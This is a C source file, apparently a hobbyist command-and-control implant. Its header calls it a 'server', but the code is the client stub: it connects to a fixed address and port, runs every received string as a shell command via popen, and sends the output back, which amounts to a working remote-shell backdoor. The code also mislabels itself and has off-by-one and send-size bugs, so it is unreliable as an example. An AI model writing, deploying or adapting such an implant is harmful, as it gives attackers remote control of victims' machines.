// Executable name   : server
// Version           : 1.0
// Created date      : 19.06.24
// Last updated      : 19.06.24
// Author            : 0x6x6d
// Architecture      : x64
// Platform          : Unix
// Description       : Simple command and control server
//
// use program
// terminal 1: ./server
// termianl 2: ./stub
// > see the response from the command executed on the client in the terminal console
// > change the command in the server.h file
//

#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define Port 50000
#define IP "127.0.0.1"
#define BUFFER_SIZE 1024

int main() {
  // -- CONNECT TO SERVER --
  int fd_sock_server;
  struct sockaddr_in server;

  server.sin_family = AF_INET;
  server.sin_port = htons(Port);
  server.sin_addr.s_addr = inet_addr(IP);

  fd_sock_server = socket(AF_INET, SOCK_STREAM, 0);
  if (fd_sock_server < 0) {
    fprintf(stderr, "[e] socket() failed: %d\n", errno);
    return 1;
  }

  if (connect(fd_sock_server, (struct sockaddr *)&server, sizeof(server))) {
    fprintf(stderr, "[e] connect() failed: %d\n", errno);
    return 1;
  }

  // -- GET DATA FROM SERVER, EXECUTE COMMAND, RETURN RESULT --
  for (;;) {
    char read[BUFFER_SIZE];
    int bytes_recv = recv(fd_sock_server, read, BUFFER_SIZE, 0);

    if (bytes_recv == -1) {
      fprintf(stderr, "[e] recv() failed: %d\n", errno);
      continue;
    }

    // receiving 0 bytes means the connection was closed by the server
    if (bytes_recv == 0) {
      printf("[i] connection closed by server\n");
      break;
    }

    // execute command
    FILE *fp;
    size_t bytes_cmd_read;
    char cmd_output[BUFFER_SIZE];
    read[bytes_recv] = '\0';
    
    fp = popen(read, "r");
    if (fp == NULL) {
      fprintf(stderr, "[e] popen() failed: %d\n", errno);
      continue;
    }

    // read cmd output
    while((bytes_cmd_read = fread(cmd_output, 1, sizeof(cmd_output) - 1, fp)) > 0) {
      cmd_output[bytes_cmd_read] = '\0';
      printf("[i] fread() output: %s\n", cmd_output);

      // send cmd output to server
      int bytes_send = send(fd_sock_server, cmd_output, sizeof(cmd_output), 0);
      if(bytes_send == -1) {
        fprintf(stderr, "[e] send() failed: %d\n", errno);
        pclose(fp);
        continue;
      }
    }

    pclose(fp);
  }

  close(fd_sock_server);
  return 0;
}
